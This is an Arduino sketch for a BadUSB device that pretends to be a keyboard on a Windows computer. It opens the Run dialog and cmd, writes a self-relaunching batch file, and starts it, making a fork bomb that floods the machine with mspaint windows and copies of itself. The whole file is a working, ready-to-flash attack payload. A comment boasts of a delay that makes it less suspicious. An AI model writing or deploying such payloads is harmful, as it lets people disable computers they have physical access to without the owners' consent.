#include <Keyboard.h>


// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{

  delay(3500);
  
  Keyboard.begin();

  // Start Payload
  
  // Fork Bomb for Windows. By: BlueArduino20

  // Let's give windows time to recognize our BadUSB

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(100);

  // Some bat delay (Less suspicious)

  Keyboard.print("copy con F.bat");

  typeKey(KEY_RETURN);

  Keyboard.print(":A");

  typeKey(KEY_RETURN);

  Keyboard.print("start mspaint.exe && start F.bat && cls");

  typeKey(KEY_RETURN);

  Keyboard.print("GOTO A");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(122);
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("start F.bat");

  typeKey(KEY_RETURN);

  // End Payload

  Keyboard.end();
}

// Unused
void loop() {}
